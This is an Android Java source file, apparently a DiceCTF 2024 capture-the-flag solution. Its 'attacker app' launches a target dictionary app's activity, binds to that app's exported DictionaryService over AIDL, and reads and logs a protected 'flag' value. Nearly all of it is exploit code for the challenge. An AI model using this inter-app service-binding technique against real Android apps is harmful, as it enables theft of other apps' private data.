package com.dicectf2024.attackerapp;

import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.os.Handler;

import androidx.appcompat.app.AppCompatActivity;

import com.dicectf2024.dictionaryservice.IDictionaryService;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "dicectf";

    // declare instances of IBinder interface generated from the AIDL file
    private IDictionaryService dictionaryService;

    // create a ServiceConnection object
    private ServiceConnection serviceConnection = new ServiceConnection() {

        // called when the connection with the service is established
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            // obtain the instance of IDictionaryService and store it in dictionaryService
            dictionaryService = IDictionaryService.Stub.asInterface(service); // dictionaryService is an instance of the
            // IDictionaryService
            Log.i(TAG, "Service connected");

            try {
                String flag = dictionaryService.getData("flag");
                Log.i(TAG, "found flag =====> " + flag);
            } catch (SecurityException | RemoteException e) {
                e.printStackTrace();
            }

        }

        // called when connection with the service is unexpectedly disconnected
        @Override
        public void onServiceDisconnected(ComponentName name) {
            dictionaryService = null;
            Log.i(TAG, "Service disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // create an intent to call Dictionaryapp
        Intent dictionaryAppIntent = new Intent();
        dictionaryAppIntent.setComponent(
                new ComponentName("com.dicectf2024.dictionaryapp", "com.dicectf2024.dictionaryapp.DefinitionActivity"));
        startActivity(dictionaryAppIntent);

        // Delay for 2 seconds before binding to DictionaryService
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                bindToDictionaryService();
            }
        }, 2000);

        setContentView(R.layout.activity_main);
    }

    private void bindToDictionaryService() {

        // create an intent to bind to the dictionary service
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.dicectf2024.dictionaryservice",
                "com.dicectf2024.dictionaryservice.DictionaryService"));

        // bind to dictionary service
        bindService(intent, serviceConnection, BIND_AUTO_CREATE);
        Log.i(TAG, "Service bound");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Unbind from the service when the activity is destroyed
        unbindService(serviceConnection);
        Log.i(TAG, "Service unbound");
    }

}
